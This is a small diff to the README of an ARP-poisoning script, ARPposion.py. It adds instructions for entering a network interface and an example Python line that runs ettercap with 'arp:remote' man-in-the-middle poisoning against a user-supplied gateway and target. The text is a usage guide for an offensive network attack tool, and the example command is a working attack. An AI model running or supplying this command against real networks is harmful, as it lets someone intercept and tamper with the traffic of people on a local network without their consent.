@@ -21,6 +21,11 @@ Or:
 ifconfig Ethernet or internal card/driver.
 
 Copy and paste the name of chosen driver into <Add connection here> on line 16 of ARPposion.py.
+    
+Delete '< >' when adding your conection point/driver.
+
+Example:
+attack1 = os.system("sudo ettercap -T -S -i wlan0 -M arp:remote /" + (input("First add gateway: ") + "//" + (input("Add target: ") + "//")))
 
 Once connection is changed, script should work.
 
